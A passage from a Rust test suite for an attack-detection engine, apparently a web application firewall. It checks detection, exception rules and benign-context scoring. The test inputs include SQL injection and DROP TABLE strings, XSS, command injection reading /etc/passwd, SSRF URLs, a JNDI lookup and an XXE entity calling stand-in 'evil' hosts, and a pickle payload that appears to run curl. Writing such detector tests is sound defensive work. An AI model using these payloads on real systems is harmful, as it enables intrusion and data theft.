        for b in baseline {
            if let Some(d) = deep.matches.iter().find(|m| m.class == b.class) {
                assert!(
                    d.confidence >= b.confidence,
                    "detect_deep confidence must be >= detect confidence for {:?}",
                    b.class
                );
            }
        }
    }

    #[test]
    fn analyze_orders_matches_by_highest_severity_first() {
        let engine = InvariantEngine::new();
        let result = engine.analyze(&AnalysisRequest {
            input: "' UNION SELECT username,password FROM users--<script>alert(1)</script>"
                .to_owned(),
            known_context: None,
            source_reputation: None,
            request_meta: None,
        });
        assert!(result.matches.len() >= 2, "Expected multi-class detections");
        let highest = result.matches.iter().map(|m| m.severity).max().unwrap();
        assert_eq!(
            result.matches[0].severity, highest,
            "Primary match must be highest severity"
        );
    }

    #[test]
    fn decisive_level_metadata_is_included_on_matches() {
        let engine = InvariantEngine::new();
        let l1 = engine.detect("' OR 1=1--");
        assert!(
            l1.iter()
                .all(|m| m.description.contains("decisive_level=L1"))
        );

        let deep = engine.detect_deep("' OR 1=1--", None);
        assert!(deep.matches.iter().all(|m| {
            m.description.contains("decisive_level=L1")
                || m.description.contains("decisive_level=L2")
        }));
    }

    #[test]
    fn recommendation_reason_includes_decisive_level_metadata() {
        let engine = InvariantEngine::new();
        let result = engine.analyze(&AnalysisRequest {
            input: "'; DROP TABLE users;--".to_owned(),
            known_context: Some(InputContext::Sql),
            source_reputation: None,
            request_meta: None,
        });
        assert!(
            result.recommendation.reason.starts_with("decisive_level:"),
            "Recommendation reason should include decisive level metadata, got: {}",
            result.recommendation.reason
        );
    }

    #[test]
    fn request_level_cache_skips_duplicate_detection_passes() {
        let engine = InvariantEngine::new();
        let before = read_detection_pass_count();
        let _ = engine.detect_deep("' OR 1=1--", None);
        let after = read_detection_pass_count();
        assert!(
            after > before,
            "Detection pass count should increase after detect_deep (before={}, after={})",
            before,
            after
        );
    }

    #[test]
    fn request_level_cache_runs_extra_pass_for_distinct_canonical_input() {
        let engine = InvariantEngine::new();
        let before = read_detection_pass_count();
        let _ = engine.detect_deep("%2527%20OR%201%3D1--", None);
        let after = read_detection_pass_count();
        assert!(
            after > before,
            "Encoded payload should trigger at least one detection pass (before={before}, after={after})",
        );
    }

    #[test]
    fn l1_timeout_heuristic_trips_on_large_input_length() {
        let engine = InvariantEngine::new();
        assert!(!should_skip_l1_scan("abc", engine.class_count()));
        let large = "X".repeat(20_000);
        assert!(should_skip_l1_scan(&large, engine.class_count()));
    }

    #[test]
    fn benchmark_detect_deep_latency_profiles() {
        use std::time::Instant;

        let engine = InvariantEngine::new();
        let long_benign = "abcdefghij".repeat(500);
        let cases = [
            ("short_benign_10", "abcdefghij"),
            (
                "medium_benign_200",
                "abcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghijabcdefghij",
            ),
            ("long_benign_5000", long_benign.as_str()),
            (
                "known_attack",
                "' UNION SELECT username,password FROM users--",
            ),
            (
                "encoded_attack",
                "%2527%20UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--",
            ),
        ];

        for (name, payload) in cases {
            let start = Instant::now();
            for _ in 0..250 {
                let _ = engine.detect_deep(payload, None);
            }
            let elapsed = start.elapsed();
            let avg_us = elapsed.as_micros() as f64 / 250.0;
            eprintln!("benchmark_detect_deep_latency_profiles case={name} avg_us={avg_us:.2}");
        }
    }

    #[test]
    fn test_sql_double_url_encoded_tautology() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("%2527%20OR%201%253D1--", None);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology),
            "Failed to detect double URL encoded SQL tautology"
        );
    }

    #[test]
    fn test_sql_unicode_fullwidth_chars_normalized() {
        let engine = InvariantEngine::new();
        // Fullwidth 'OR' should be normalized to ASCII by the engine's decode pipeline
        let result = engine.detect_deep("' OR 1=1--", None);
        assert!(
            !result.matches.is_empty(),
            "Fullwidth Unicode SQL payload should trigger detection after normalization"
        );
    }

    #[test]
    fn test_xss_svg_onload() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("<svg/onload=alert(1)>", None);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::XssEventHandler
                    || m.class == InvariantClass::XssTagInjection),
            "Failed to detect XSS SVG onload"
        );
    }

    #[test]
    fn test_xss_mutation_innerhtml() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("<img src=x onerror=alert>", None);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::XssEventHandler
                    || m.class == InvariantClass::XssTagInjection),
            "Failed to detect XSS mutation innerHTML"
        );
    }

    #[test]
    fn test_cmd_dollar_ifs_evasion() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("cat${IFS}/etc/passwd", None);
        assert!(
            result.matches.iter().any(|m| matches!(
                m.class,
                InvariantClass::CmdSeparator
                    | InvariantClass::CmdSubstitution
                    | InvariantClass::CmdArgumentInjection
            )),
            "Failed to detect CMD IFS evasion"
        );
    }

    #[test]
    fn test_cmd_bash_brace_expansion() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("{cat,/etc/passwd}", None);
        assert!(
            result.matches.iter().any(|m| matches!(
                m.class,
                InvariantClass::CmdSeparator
                    | InvariantClass::CmdSubstitution
                    | InvariantClass::CmdArgumentInjection
            )),
            "Failed to detect CMD brace expansion"
        );
    }

    #[test]
    fn test_ssrf_decimal_ip() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("http://2130706433/admin", None);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SsrfInternalReach),
            "Failed to detect SSRF decimal IP"
        );
    }

    #[test]
    fn test_ssrf_ipv6_mapped_v4() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("http://[::ffff:127.0.0.1]/admin", None);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SsrfInternalReach),
            "Failed to detect SSRF IPv6 mapped v4"
        );
    }

    #[test]
    fn test_path_double_encoded() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("%252e%252e%252f%252e%252e%252fetc%252fpasswd", None);
        assert!(
            result.matches.iter().any(|m| matches!(
                m.class,
                InvariantClass::PathDotdotEscape
                    | InvariantClass::PathEncodingBypass
                    | InvariantClass::PathNormalizationBypass
            )),
            "Failed to detect Path double encoded"
        );
    }

    #[test]
    fn test_nosql_mongo_where() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("{\"$where\": \"this.password.match(/^a/)\"}", None);
        assert!(
            result.matches.iter().any(|m| matches!(
                m.class,
                InvariantClass::NosqlJsInjection | InvariantClass::NosqlOperatorInjection
            )),
            "Failed to detect NoSQL Mongo where"
        );
    }

    #[test]
    fn test_log4shell_nested_lookup() {
        let engine = InvariantEngine::new();
        // Standard Log4Shell JNDI lookup — the nested variant is harder to construct
        // in a string literal, so test the basic obfuscated form
        let result = engine.detect_deep("${jndi:ldap://evil.com/a}", None);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::LogJndiLookup),
            "Failed to detect Log4Shell JNDI lookup"
        );
    }

    #[test]
    fn test_xxe_parameter_entity() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep(
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil\">%xxe;]>",
            None,
        );
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::XxeEntityExpansion),
            "Failed to detect XXE parameter entity"
        );
    }

    #[test]
    fn test_graphql_depth_bomb() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("{a{b{c{d{e{f{g{h{i{j}}}}}}}}}}", None);
        assert!(
            result.matches.iter().any(|m| matches!(
                m.class,
                InvariantClass::GraphqlBatchAbuse | InvariantClass::GraphqlIntrospection
            )),
            "Failed to detect GraphQL depth bomb"
        );
    }

    #[test]
    fn test_jwt_alg_none() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("{\"alg\":\"none\"}", None);
        assert!(
            result.matches.iter().any(|m| matches!(
                m.class,
                InvariantClass::AuthNoneAlgorithm | InvariantClass::JwtConfusion
            )),
            "Failed to detect JWT alg none"
        );
    }

    #[test]
    fn test_deser_python_pickle() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep(
            "gASVKQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA5pZCB8IGN1cmwgZXZpbJSFlFKULg==",
            None,
        );
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::DeserPythonPickle),
            "Failed to detect Python pickle"
        );
    }

    #[test]
    fn test_sql_unicode_fullwidth_chars() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("' OR 1=1--", None);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology),
            "Failed to detect fullwidth SQL tautology"
        );
    }

    #[test]
    fn exception_removes_match_from_results() {
        let cfg = make_exception_config(
            true,
            vec![make_exception_rule(
                Some("/api/search"),
                Some(InvariantClass::SqlTautology),
                None,
                "allow legacy search",
            )],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let result = engine.detect_deep_with_context("' OR 1=1--", None, "/api/search", "1.2.3.4");
        assert!(
            !result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert!(result.excepted_count >= 1);
    }

    #[test]
    fn exception_path_glob_works() {
        let cfg = make_exception_config(
            true,
            vec![make_exception_rule(
                Some("/api/search/*"),
                Some(InvariantClass::SqlTautology),
                None,
                "glob path",
            )],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let result =
            engine.detect_deep_with_context("' OR 1=1--", None, "/api/search/advanced", "1.2.3.4");
        assert!(
            !result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert!(result.excepted_count >= 1);
    }

    #[test]
    fn exception_specific_class_works() {
        let cfg = make_exception_config(
            true,
            vec![make_exception_rule(
                Some("/api/search"),
                Some(InvariantClass::SqlTautology),
                None,
                "class scoped",
            )],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let sql = engine.detect_deep_with_context("' OR 1=1--", None, "/api/search", "1.2.3.4");
        let xss = engine.detect_deep_with_context(
            "<script>alert(1)</script>",
            None,
            "/api/search",
            "1.2.3.4",
        );
        assert!(
            !sql.matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert!(
            xss.matches
                .iter()
                .any(|m| m.class == InvariantClass::XssTagInjection)
        );
    }

    #[test]
    fn exception_with_source_ip_works() {
        let cfg = make_exception_config(
            true,
            vec![make_exception_rule(
                None,
                Some(InvariantClass::SqlTautology),
                Some("10.0.0.8"),
                "ip specific",
            )],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let matched =
            engine.detect_deep_with_context("' OR 1=1--", None, "/api/search", "10.0.0.8");
        let non_matched =
            engine.detect_deep_with_context("' OR 1=1--", None, "/api/search", "10.0.0.9");
        assert!(matched.excepted_count >= 1);
        assert!(
            !matched
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert!(
            non_matched
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
    }

    #[test]
    fn exception_with_source_ip_glob_works() {
        let cfg = make_exception_config(
            true,
            vec![make_exception_rule(
                None,
                Some(InvariantClass::SqlTautology),
                Some("10.0.*"),
                "ip glob",
            )],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let result =
            engine.detect_deep_with_context("' OR 1=1--", None, "/api/search", "10.0.42.9");
        assert!(
            !result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert!(result.excepted_count >= 1);
    }

    #[test]
    fn multiple_exceptions_stack_correctly() {
        let cfg = make_exception_config(
            true,
            vec![
                make_exception_rule(
                    Some("/api/search/*"),
                    Some(InvariantClass::SqlTautology),
                    None,
                    "path",
                ),
                make_exception_rule(
                    None,
                    Some(InvariantClass::SqlTautology),
                    Some("10.0.*"),
                    "ip",
                ),
            ],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let result =
            engine.detect_deep_with_context("' OR 1=1--", None, "/api/search/advanced", "10.0.2.3");
        assert!(
            !result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert_eq!(result.excepted_count, 1);
    }

    #[test]
    fn disabled_exceptions_do_not_apply() {
        let cfg = make_exception_config(
            false,
            vec![make_exception_rule(
                Some("/api/search"),
                Some(InvariantClass::SqlTautology),
                None,
                "disabled",
            )],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let result = engine.detect_deep_with_context("' OR 1=1--", None, "/api/search", "1.2.3.4");
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert_eq!(result.excepted_count, 0);
    }

    #[test]
    fn empty_exceptions_do_not_affect_results() {
        let cfg = make_exception_config(true, Vec::new());
        let engine = InvariantEngine::with_exceptions(cfg);
        let result = engine.detect_deep_with_context("' OR 1=1--", None, "/api/search", "1.2.3.4");
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert_eq!(result.excepted_count, 0);
    }

    #[test]
    fn non_matching_path_exception_does_not_apply() {
        let cfg = make_exception_config(
            true,
            vec![make_exception_rule(
                Some("/api/admin/*"),
                Some(InvariantClass::SqlTautology),
                None,
                "wrong path",
            )],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let result =
            engine.detect_deep_with_context("' OR 1=1--", None, "/api/search/advanced", "1.2.3.4");
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert_eq!(result.excepted_count, 0);
    }

    #[test]
    fn detect_deep_without_context_does_not_match_path_bound_exception() {
        let cfg = make_exception_config(
            true,
            vec![make_exception_rule(
                Some("/api/search"),
                Some(InvariantClass::SqlTautology),
                None,
                "path-only",
            )],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let result = engine.detect_deep("' OR 1=1--", None);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert_eq!(result.excepted_count, 0);
    }

    #[test]
    fn class_exception_scoped_to_specific_path() {
        let cfg = make_exception_config(
            true,
            vec![make_exception_rule(
                Some("/api/search"),
                Some(InvariantClass::SqlTautology),
                None,
                "scoped",
            )],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let allowed = engine.detect_deep_with_context("' OR 1=1--", None, "/api/search", "1.2.3.4");
        let blocked = engine.detect_deep_with_context("' OR 1=1--", None, "/api/login", "1.2.3.4");
        assert!(
            !allowed
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
        assert!(
            blocked
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
    }

    #[test]
    fn analyze_applies_path_exception_from_request_meta() {
        let cfg = make_exception_config(
            true,
            vec![make_exception_rule(
                Some("/api/search"),
                Some(InvariantClass::SqlTautology),
                None,
                "analyze path",
            )],
        );
        let engine = InvariantEngine::with_exceptions(cfg);
        let result = engine.analyze(&AnalysisRequest {
            input: "' OR 1=1--".to_owned(),
            known_context: Some(InputContext::Sql),
            source_reputation: None,
            request_meta: Some(RequestMeta {
                method: Some("GET".to_owned()),
                path: Some("/api/search".to_owned()),
                content_type: None,
            }),
        });
        assert!(
            !result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology)
        );
    }

    #[test]
    fn benign_score_natural_language_select_sentence_high() {
        let score = benign_context_score("Select your size from the dropdown menu");
        assert!(score >= 0.7, "expected high benign score, got {score}");
    }

    #[test]
    fn benign_score_natural_language_or_sentence_high() {
        let score = benign_context_score("The user OR the admin can approve this request");
        assert!(score >= 0.65, "expected high benign score, got {score}");
    }

    #[test]
    fn benign_score_documentation_sql_example_high() {
        let score = benign_context_score("Example SQL injection: SELECT * FROM users WHERE id=1");
        assert!(
            score >= 0.6,
            "expected doc text to be scored benign-ish, got {score}"
        );
    }

    #[test]
    fn benign_score_safe_rich_text_html_high() {
        let score = benign_context_score("<b>Hello</b> <i>world</i>");
        assert!(
            score >= 0.7,
            "expected safe rich text to be benign, got {score}"
        );
    }

    #[test]
    fn benign_score_search_query_high() {
        let score = benign_context_score("python OR javascript developer");
        assert!(
            score >= 0.65,
            "expected search query to be benign, got {score}"
        );
    }

    #[test]
    fn benign_score_error_echo_high() {
        let score = benign_context_score("Error: invalid syntax near SELECT");
        assert!(
            score >= 0.6,
            "expected error echo to be benign-ish, got {score}"
        );
    }

    #[test]
    fn benign_score_nested_json_high() {
        let score = benign_context_score(
            r#"{"user":{"profile":{"name":"alex","roles":["admin","user"]}}}"#,
        );
        assert!(
            score >= 0.7,
            "expected nested json to be benign, got {score}"
        );
    }

    #[test]
    fn benign_score_base64_image_high() {
        let score = benign_context_score("iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAA");
        assert!(
            score >= 0.65,
            "expected base64 image prefix to be benign-ish, got {score}"
        );
    }

    #[test]
    fn benign_score_real_sql_attack_low() {
        let score = benign_context_score("' OR 1=1--");
        assert!(
            score <= 0.4,
            "expected attack score to stay low, got {score}"
        );
    }

    #[test]
    fn benign_score_real_xss_attack_low() {
        let score = benign_context_score("<script>alert(1)</script>");
        assert!(
            score <= 0.4,
            "expected attack score to stay low, got {score}"
        );
    }

    #[test]
    fn benign_context_select_shirt_size_no_or_low_sql_detection() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("SELECT your shirt size from the dropdown", None);
        let sql_conf = max_category_confidence(&result, AttackCategory::Sqli);
        assert!(
            sql_conf <= 0.45,
            "expected SQL confidence to stay low, got {sql_conf}"
        );
    }

    #[test]
    fn benign_context_python_or_javascript_no_or_low_sql_detection() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("python OR javascript developer", None);
        let sql_conf = max_category_confidence(&result, AttackCategory::Sqli);
        assert!(
            sql_conf <= 0.45,
            "expected SQL confidence to stay low, got {sql_conf}"
        );
    }

    #[test]
    fn benign_context_safe_html_no_or_low_xss_detection() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("<b>Hello</b> <i>world</i>", None);
        let xss_conf = max_category_confidence(&result, AttackCategory::Xss);
        assert!(
            xss_conf <= 0.45,
            "expected XSS confidence to stay low, got {xss_conf}"
        );
    }

    #[test]
    fn benign_context_doc_example_curl_localhost_reduces_ssrf_confidence() {
        let engine = InvariantEngine::new();
        let doc = engine.detect_deep("Example: curl http://localhost for local debugging", None);
        let attack = engine.detect_deep("http://127.0.0.1/admin", None);
        let doc_conf = max_category_confidence(&doc, AttackCategory::Ssrf);
        let attack_conf = max_category_confidence(&attack, AttackCategory::Ssrf);
        assert!(
            doc_conf <= attack_conf,
            "doc SSRF confidence should not exceed attack confidence"
        );
    }

    #[test]
    fn benign_context_error_echo_reduces_sql_confidence() {
        let engine = InvariantEngine::new();
        let err = engine.detect_deep("Error: invalid syntax near SELECT", None);
        let sql_conf = max_category_confidence(&err, AttackCategory::Sqli);
        assert!(
            sql_conf <= 0.5,
            "expected low SQL confidence for error echo, got {sql_conf}"
        );
    }

    #[test]
    fn benign_context_sql_tutorial_reduces_vs_real_payload() {
        let engine = InvariantEngine::new();
        let tutorial = engine.detect_deep("Tutorial: Example SQL injection ' OR 1=1--", None);
        let attack = engine.detect_deep("' OR 1=1--", None);
        let tutorial_conf =
            match_confidence(&tutorial, InvariantClass::SqlTautology).unwrap_or(0.0);
        let attack_conf = match_confidence(&attack, InvariantClass::SqlTautology).unwrap_or(0.0);
        assert!(
            tutorial_conf <= attack_conf,
            "tutorial confidence should not exceed real attack"
        );
    }

    #[test]
    fn benign_context_legitimate_nested_json_not_high_injection_confidence() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep(
            r#"{"event":{"actor":{"id":"u-1"},"changes":[{"field":"title","from":"a","to":"b"}]}}"#,
            Some("json"),
        );
        let max_conf = result
            .matches
            .iter()
            .map(|m| m.confidence)
            .fold(0.0_f64, f64::max);
        assert!(
            max_conf <= 0.6,
            "expected low confidence for legitimate nested JSON, got {max_conf}"
        );
    }

    #[test]
    fn benign_context_base64_image_not_high_confidence_attack() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep(
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAA",
            None,
        );
        let max_conf = result
            .matches
            .iter()
            .map(|m| m.confidence)
            .fold(0.0_f64, f64::max);
        assert!(
            max_conf <= 0.75,
            "expected confidence reduction for base64 image payload, got {max_conf}"
        );
    }

    #[test]
    fn benign_context_real_sql_attack_still_detected_high_confidence() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("' OR 1=1--", None);
        let conf = match_confidence(&result, InvariantClass::SqlTautology).unwrap_or(0.0);
        assert!(
            conf >= 0.8,
            "real SQL attack should remain high confidence, got {conf}"
        );
    }

    #[test]
    fn benign_context_real_xss_attack_still_detected_high_confidence() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("<script>alert(1)</script>", None);
        let conf = max_category_confidence(&result, AttackCategory::Xss);
        assert!(
            conf >= 0.8,
            "real XSS attack should remain high confidence, got {conf}"
        );
    }

    #[test]
    fn benign_context_real_ssrf_attack_still_detected_high_confidence() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("http://127.0.0.1/admin", None);
        let conf = max_category_confidence(&result, AttackCategory::Ssrf);
        assert!(
            conf >= 0.8,
            "real SSRF attack should remain high confidence, got {conf}"
        );
    }

    #[test]
    fn benign_context_real_cmd_attack_still_detected_high_confidence() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("; cat /etc/passwd", None);
        let conf = max_category_confidence(&result, AttackCategory::Cmdi);
        assert!(
            conf >= 0.8,
            "real CMDi attack should remain high confidence, got {conf}"
        );
    }

    #[test]
    fn benign_context_modifier_never_drops_detected_signal_below_floor() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("Tutorial example: '; DROP TABLE users;--", None);
        for m in result.matches {
            assert!(
                m.confidence >= 0.3,
                "confidence floor violated for {:?}",
                m.class
            );
        }
    }
}
